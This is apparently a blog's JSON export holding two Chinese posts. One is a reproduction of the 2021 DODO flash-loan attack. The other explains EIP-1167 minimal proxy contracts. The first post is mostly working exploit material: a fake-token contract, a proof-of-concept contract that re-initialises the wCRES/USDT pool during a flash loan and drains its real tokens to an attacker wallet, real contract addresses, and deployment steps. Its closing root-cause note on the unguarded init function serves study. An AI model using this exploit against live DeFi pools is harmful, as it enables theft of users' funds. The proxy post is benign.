{"meta":{"title":"SCC","subtitle":"","description":"","author":"Janson Woods","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"DODO_FlashLoan攻击复现--狸猫换太子","slug":"DODO-flashloan攻击分析与复现","date":"2021-09-27T02:42:40.000Z","updated":"2021-09-27T04:37:28.862Z","comments":true,"path":"2021/09/27/DODO-flashloan攻击分析与复现/","link":"","permalink":"http://example.com/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"通过事件最后的状态可知，攻击者地址减少的两种空气币数额与攻击合约增加的WrappedERC20、TetherToken数额一一对应，相当于将DVM合约中WrappedERC20、TetherToken的两种币”等价的“交换为两种空气币。 攻击简述 交易哈希： 10x395675b56370a9f5fe8b32badfa80043f5291443bd6c8273900476880fb5221e 攻击复现1.发两种空气币token1，token2.erc20代币合约 123456789101112131415161718192021222324252627282930313233343536373839404142434445/ SPDX-License-Identifier: MITpragma solidity &gt;=0.8.0 &lt;0.9.0;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;contract _ERC20 is ERC20, Ownable &#123; uint8 private currentDecimals; enum TOKEN_TYPE &#123;CAPPED,UNCAPPED&#125; TOKEN_TYPE public tokenType; constructor( string memory _name, string memory _symbol, uint8 _decimals, uint256 _initialSupply, TOKEN_TYPE _tokenType ) ERC20(_name, _symbol) &#123; currentDecimals = _decimals; tokenType = _tokenType; / mint token to the address of the account that sent the transaction. transferOwnership(tx.origin); _mint(tx.origin, _initialSupply * (10**uint256(_decimals))); &#125; modifier unCapped &#123; require(tokenType == _ERC20.TOKEN_TYPE.UNCAPPED,&quot;support only uncapped token&quot;); _; &#125; function decimals() public view virtual override returns (uint8) &#123; return currentDecimals; &#125; function mint(address _address,uint256 _amount) public unCapped onlyOwner returns (bool) &#123; _mint(_address,_amount); return true; &#125; function burn(address _address,uint256 _amount) public unCapped onlyOwner returns (bool) &#123; _burn(_address,_amount); return true; &#125;&#125; token1： token2： 2.将空气币打入wCRES/USDT交易对wCRES/USDT 地址：0x051EBD717311350f1684f89335bed4ABd083a2b6 各打入足量的数量（10000000000000000000000000000）。 3.修改攻击合约参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109/** *Submitted for verification at Etherscan.io on 2021-01-22*//* Copyright 2020 DODO ZOO. SPDX-License-Identifier: Apache-2.0*/pragma solidity 0.6.9;pragma experimental ABIEncoderV2;interface DVM&#123; function flashLoan( uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data ) external; function init( address maintainer, address baseTokenAddress, address quoteTokenAddress, uint256 lpFeeRate, address mtFeeRateModel, uint256 i, uint256 k, bool isOpenTWAP ) external; &#125;interface Token &#123; function balanceOf(address account) external view returns (uint); function transfer(address recipient, uint amount) external returns (bool);&#125;interface USDT&#123; /USDT 并没有完全遵循 ERC20 标准 所以其接口需单独定义 function transfer(address to, uint value) external; function balanceOf(address account) external view returns (uint);&#125;contract poc&#123; uint256 wCRES_amount = 130000000000000000000000; uint256 usdt_amount = 1100000000000; address wCRES_token = 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a; address usdt_token = 0xdAC17F958D2ee523a2206206994597C13D831ec7; address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0; / 这里是刚生成的Token1地址 address token1 = 0x9431cc8868a6a9993E25C7abB93aD2aca5592c5C; / 这里是刚生成的Token2地址 address token2 = 0x445390C704Ed94F2F719d0eb7cda2633a72753A5; uint256 lpFeeRate = 3000000000000000; address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01; uint256 i = 1; uint256 k = 1000000000000000000; bool isOpenTWAP = false; / 这里填你的测试地址 address wallet = ; address dvm_wCRES_USDT = 0x051EBD717311350f1684f89335bed4ABd083a2b6; bytes data = abi.encodeWithSignature(&quot;init(address,address,address,uint256,address,uint256,uint256,bool)&quot;,maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP); function attack() public &#123; address me = address(this); DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT); DVM_wCRES_USDT.flashLoan(wCRES_amount,usdt_amount,me,&quot; &quot;); &#125; function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public&#123; DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT); DVM_wCRES_USDT.init(maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP); Token(wCRES_token).transfer(wallet, Token(wCRES_token).balanceOf(address(this))); USDT(usdt_token).transfer(wallet, Token(usdt_token).balanceOf(address(this))); &#125;&#125; 该攻击合约主要完成以下工作： 1.调用DVM的闪电贷函数进行闪电贷，将传入的assetTo参数修改为攻击合约。 2.DVM执行闪电贷逻辑，乐观转账后，调用assetTo地址的DVMFlashLoanCall函数，由于攻击者传入的assetTo参数的值为攻击合约地址，因此会调用攻击合约中的DVMFlashLoanCall函数， 在该函数中，对wCRES/USDT 交易对合约（DVM合约）进行初始化函数（init）的调用。使得合约中 交易对地址信息baseTokenAddress,quoteTokenAddress,变为攻击者发行的两个空气币地址。 3.执行闪电贷的赎回操作 由于此时攻击者已将合约的交易对地址信息初始化为两种空气币的地址，并在实现给交易对地址打入了足量的两种空气币。使得DVM合约认为两种空气币就是原来的两种代币，并且是足量的，完成闪电贷最后的检查工作。 因此本次攻击是因为项目方并没有对初始化加以身份权限设定，使得任何人可以调用init函数。","categories":[],"tags":[{"name":"复盘分析、闪电贷","slug":"复盘分析、闪电贷","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7/"}]},{"title":"EIP1167-最小合约代理的理解","slug":"EIP1167-最小合约代理的理解","date":"2021-09-27T02:42:40.000Z","updated":"2021-09-27T03:27:18.030Z","comments":true,"path":"2021/09/27/EIP1167-最小合约代理的理解/","link":"","permalink":"http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"","text":"避免“重复部署某一个合约导致过多的存储空间被用在重复的运行时字节码的存储”。 当需要某一份代码被大量部署时，这样就会使得大量的存储空间来存储相同的运行字节码，并消耗大量的Gas费用，引入EIP1167-最小合约代理来节省这部分存储与Gas消耗。 总体思路：设置一个母合约被用来委托调用，实现合约的逻辑部分；通过工厂合约创建多个子合约与用户直接交互。当用户向子合约发来请求时，子合约通过委托调用（delegatecall）的方式调用母合约的函数逻辑修改子合约的存储。因为子合约中并没有对应函数的处理逻辑，唯一实现的功能是委托调用母合约的函数，完成计算与状态更改，并将结果返回给用户。 通过EIP1167这种模式的设计可以很好的避免因代码复用导致资源浪费的问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131pragma solidity ^0.5.0;contract MetaCoinClonable &#123; mapping (address =&gt; uint) balances; function initialize(address metaCoinOwner, uint256 initialBalance) public &#123; balances[metaCoinOwner] = initialBalance; &#125; function sendCoin(address receiver, uint amount) public returns(bool sufficient) &#123; if (balances[msg.sender] &lt; amount) return false; balances[msg.sender] -= amount; balances[receiver] += amount; return true; &#125; function getBalance(address addr) view public returns(uint) &#123; return balances[addr]; &#125;&#125;contract Ownable &#123; /** * @dev Event to show ownership has been transferred * @param previousOwner representing the address of the previous owner * @param newOwner representing the address of the new owner */ event OwnershipTransferred(address previousOwner, address newOwner); // Owner of the contract address private _owner; /** * @dev Throws if called by any account other than the owner. */ modifier onlyOwner() &#123; require(msg.sender == owner()); _; &#125; /** * @dev The constructor sets the original owner of the contract to the sender account. */ constructor() public &#123; setOwner(msg.sender); &#125; /** * @dev Tells the address of the owner * @return the address of the owner */ function owner() public view returns (address) &#123; return _owner; &#125; /** * @dev Sets a new owner address */ function setOwner(address newOwner) internal &#123; _owner = newOwner; &#125; /** * @dev Allows the current owner to transfer control of the contract to a newOwner. * @param newOwner The address to transfer ownership to. */ function transferOwnership(address newOwner) public onlyOwner &#123; require(newOwner != address(0)); emit OwnershipTransferred(owner(), newOwner); setOwner(newOwner); &#125;&#125;// https://github.com/optionality/clone-factory/blob/master/contracts/CloneFactory.solcontract CloneFactory &#123; function createClone(address target) internal returns (address result) &#123; bytes20 targetBytes = bytes20(target); assembly &#123; let clone := mload(0x40) mstore(clone, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000) mstore(add(clone, 0x14), targetBytes) mstore(add(clone, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000) result := create(0, clone, 0x37) &#125; &#125; function isClone(address target, address query) internal view returns (bool result) &#123; bytes20 targetBytes = bytes20(target); assembly &#123; let clone := mload(0x40) mstore(clone, 0x363d3d373d3d3d363d7300000000000000000000000000000000000000000000) mstore(add(clone, 0xa), targetBytes) mstore(add(clone, 0x1e), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000) let other := add(clone, 0x40) extcodecopy(query, other, 0, 0x2d) result := and( eq(mload(clone), mload(other)), eq(mload(add(clone, 0xd)), mload(add(other, 0xd))) ) &#125; &#125;&#125;contract MetaCoinCloneFactory is CloneFactory, Ownable &#123; MetaCoinClonable[] public metaCoinAddresses; event MetaCoinCreated(MetaCoinClonable metaCoin); address public libraryAddress; address public metaCoinOwner; function setLibraryAddress(address _libraryAddress) external onlyOwner &#123; libraryAddress = _libraryAddress; &#125; function createMetaCoin(address _metaCoinOwner, uint256 initialBalance) external &#123; MetaCoinClonable metaCoin = MetaCoinClonable( createClone(libraryAddress) ); metaCoin.initialize(_metaCoinOwner, initialBalance); metaCoinAddresses.push(metaCoin); emit MetaCoinCreated(metaCoin); &#125; function getMetaCoins() external view returns (MetaCoinClonable[] memory) &#123; return metaCoinAddresses; &#125;&#125; 第一步：部署母合约 母合约地址为：0x619B0084D96D51Ab63832d2e36d408f9d7d9a9f5 第二步：部署工厂合约 工厂合约地址为：0x15aB5Ad34da64381f0F0E72025de389653585Ef6 第三步：设置克隆合约（库合约）地址 将刚才获得的母合约地址0x619B0084D96D51Ab63832d2e36d408f9d7d9a9f5作为参数，调用setLibraryAddress函数，将母合约地址设置为克隆合约地址。 第四步：创建子合约（可设置多个） 将合约的owner地址和初始化余额作为参数，调用createMetaCoin，获得子合约。 可通过调用getMetaCoins来查询部署子合约的地址。0x8aeb371cd806c56426d5722d32f8a6e1ad4cc605 通过查看子合约的字节码文件可发现，子合约的处理逻辑是将接收到的请求通过委托调用的方式传发给母合约来进行处理，但是子合约的存储信息是存储在子合约中的。因此可以将子合约看作母合约的一个代理合约。 可以看到接受用户请求的子合约中并不包含合约中各种函数的处理逻辑，子合约以代理的形式进行委托调用，调用合约的函数逻辑进行处理，并将信息反馈给用户，可以很好的避免合约部署时内存滥用和大量Gas消耗。","categories":[],"tags":[{"name":"EIP协议","slug":"EIP协议","permalink":"http://example.com/tags/EIP%E5%8D%8F%E8%AE%AE/"}]}],"categories":[],"tags":[{"name":"复盘分析、闪电贷","slug":"复盘分析、闪电贷","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7/"},{"name":"EIP协议","slug":"EIP协议","permalink":"http://example.com/tags/EIP%E5%8D%8F%E8%AE%AE/"}]}